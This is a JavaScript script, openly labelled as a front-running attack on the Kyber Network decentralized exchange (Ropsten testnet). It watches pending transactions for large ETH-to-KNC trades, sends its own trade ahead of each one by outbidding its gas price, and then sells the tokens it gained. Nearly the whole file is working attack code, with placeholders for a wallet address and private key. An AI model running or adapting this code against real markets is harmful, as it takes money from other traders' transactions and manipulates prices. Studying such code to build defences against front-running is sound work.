/**
 * Perform a front-running attack on Kyber Network (ropsten)
 */

var Web3 = require('web3');
var fetch = require('node-fetch');
var Tx = require('ethereumjs-tx').Transaction;

const {ERC20_ABI, KYBER_NETWORK_PROXY_ABI} = require('./constants.js');

const NETWORK = "ropsten";
const PROJECT_ID = "ENTER YOUR PROJECT ID";
const web3 = new Web3(new Web3.providers.HttpProvider(`https://${NETWORK}.infura.io/v3/${PROJECT_ID}`));
const NETWORK_URL = `https://${NETWORK}-api.kyber.network`;

// KyberNetworkProxy
const KYBER_NETWORK_PROXY = '0x818E6FECD516Ecc3849DAf6845e3EC868087B755';

// Get the KyberNetworkContract instances
const KYBER_NETWORK_PROXY_CONTRACT = new web3.eth.Contract(
    KYBER_NETWORK_PROXY_ABI,
    KYBER_NETWORK_PROXY
);

// Representation of ETH as an address on Ropsten
const ETH_TOKEN_ADDRESS = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
// KNC contract address on Ropsten
const KNC_TOKEN_ADDRESS = '0x4E470dc7321E84CA96FcAEDD0C8aBCebbAEB68C6';

// method id
const TRADE_WITH_HINT = '0x29589f61';
const TRADE = '0xcb3c28c7';
// wallet address for fee sharing program
const WALLET_ID = "0x0000000000000000000000000000000000000000"
const ETH_DECIMALS = 18;
const KNC_DECIMALS = 18;
// How many KNC you want to buy
const KNC_QTY = 10;
// How many ETH you want to sell
const ETH_QTY = 10;
const ETH_QTY_WEI = ETH_QTY * 10 ** ETH_DECIMALS;
// threshold to trigger front running attack
const THRESHOLD = 10;
// Gas price of the transaction
const GAS_PRICE = 'medium';
// one gwei
const ONE_GWEI = 1e9;
// max gas price
const MAX_GAS_PRICE = 50000000000;
// Your Ethereum wallet address
const USER_ACCOUNT = 'ENTER YOUR WALLET ADDRESS';
// Your private key
const PRIVATE_KEY = Buffer.from('ENTER YOUR PRIVATE KEY', 'hex');
// if the front run has succeed
var succeed = false;

var subscription;

async function main() {
    // get token balance before
    let tokenBalanceBefore = await getTokenBalance(KNC_TOKEN_ADDRESS);
    // get pending transactions
    const web3Ws = new Web3(new Web3.providers.WebsocketProvider(`wss://${NETWORK}.infura.io/ws/v3/${PROJECT_ID}`));
    subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
    }).on("data", async function (transactionHash) {
        let transaction = await web3.eth.getTransaction(transactionHash);
        await handleTransaction(transaction);
        
        if (succeed) {
            console.log("Front-running attack succeed.");
            // sell tokens
            let tokenBalanceAfter = await getTokenBalance(KNC_TOKEN_ADDRESS);
            let srcAmount = (tokenBalanceAfter - tokenBalanceBefore) / (10 ** KNC_DECIMALS);
            console.log("Get " + srcAmount + " Tokens.");
            console.log("Begin selling the tokens.");
            await performTrade(KNC_TOKEN_ADDRESS, ETH_TOKEN_ADDRESS, srcAmount);
            console.log("End.")
            process.exit();
        }
    })
}

async function handleTransaction(transaction) {
    if (transaction['to'] == KYBER_NETWORK_PROXY && await isPending(transaction['hash'])) {
        console.log("Found pending Kyber network transaction", transaction);
    } else {
        return
    } 
    let gasPrice = parseInt(transaction['gasPrice']);
    let newGasPrice = gasPrice + ONE_GWEI;
    if (newGasPrice > MAX_GAS_PRICE) {
        newGasPrice = MAX_GAS_PRICE;
    }
    
    if (triggersFrontRun(transaction)) {
        subscription.unsubscribe();
        console.log('Perform front running attack...');
        await performTrade(ETH_TOKEN_ADDRESS, KNC_TOKEN_ADDRESS, ETH_QTY, newGasPrice);
        // wait until the honest transaction is done
        console.log("wait until the honest transaction is done...");
        while (await isPending(transaction['hash'])) { }
        succeed = true;
    }
}

function triggersFrontRun(transaction) {
    if (transaction['to'] != KYBER_NETWORK_PROXY) {
        return false
    }
    let data = parseTx(transaction['input']);
    let method = data[0], params = data[1];
    if (method == TRADE || method == TRADE_WITH_HINT) {
        let srcAddr = params[0], srcAmount = params[1], toAddr = params[2];
        return (srcAddr == ETH_TOKEN_ADDRESS) && 
                    (toAddr == KNC_TOKEN_ADDRESS) && (srcAmount >= THRESHOLD)
    }
    return false
}

async function performTrade(srcAddr, destAddr, srcAmount, gasPrice = null) {
    console.log('Begin transaction...');

    let destAmount = await getQuoteAmount(srcAddr, destAddr, srcAmount);
    console.log(destAmount);
    let tradeDetailsRequest = await fetch(
        `${NETWORK_URL}/trade_data?user_address=` +
        USER_ACCOUNT +
        "&src_id=" +
        srcAddr +
        "&dst_id=" +
        destAddr +
        "&src_qty=" +
        srcAmount +
        "&min_dst_qty=" +
        destAmount +
        "&gas_price=" +
        GAS_PRICE
        // "&wallet_id=" +
        // WALLET_ID
    );
    let tradeDetails = await tradeDetailsRequest.json();
    // Extract the raw transaction details
    let rawTx = tradeDetails.data[0];
    if (gasPrice) {
        rawTx['gasPrice'] = '0x' + gasPrice.toString(16);
    }
    console.log("Planning to send: ", rawTx);
    // Create a new transaction
    let tx = new Tx(rawTx, { 'chain': 'ropsten' });
    // Signing the transaction
    tx.sign(PRIVATE_KEY);
    // Serialise the transaction (RLP encoding)
    let serializedTx = tx.serialize();
    // Broadcasting the transaction
    txReceipt = await web3.eth
        .sendSignedTransaction("0x" + serializedTx.toString("hex"))
        .catch(error => console.log(error));
    // Log the transaction receipt
    console.log("Transaction DONE! Receipt: ", txReceipt);
}

async function getQuoteAmount(srcToken, destToken, srcQty) {
    let quoteAmountRequest = await fetch(`${NETWORK_URL}/quote_amount?base=${srcToken}&quote=${destToken}&base_amount=${srcQty}&type=sell`)
    let quoteAmount = await quoteAmountRequest.json();
    quoteAmount = quoteAmount.data;
    return quoteAmount * 0.97;
}

async function isPending(transactionHash) {
    return await web3.eth.getTransactionReceipt(transactionHash) == null;
}

function parseTx(input) {
    if (input == '0x') {
        return ['0x', []]
    }
    if ((input.length - 8 - 2) % 64 != 0) {
        throw "Data size misaligned with parse request."
    }
    let method = input.substring(0, 10);
    let numParams = (input.length - 8 - 2) / 64;
    var params = [];
    for (i = 0; i < numParams; i += 1) {
        let param = parseInt(input.substring(10 + 64 * i, 10 + 64 * (i + 1)), 16);
        params.push(param);
    }
    return [method, params]
}

async function getTokenBalance(tokenAddr) {
    const TOKEN_CONTRACT = new web3.eth.Contract(ERC20_ABI, tokenAddr);
    return await TOKEN_CONTRACT.methods.balanceOf(USER_ACCOUNT).call();
}

main();


// for test only
async function test() {
    let token = await getTokenBalance(KNC_TOKEN_ADDRESS);
    console.log(token);
}

// test();
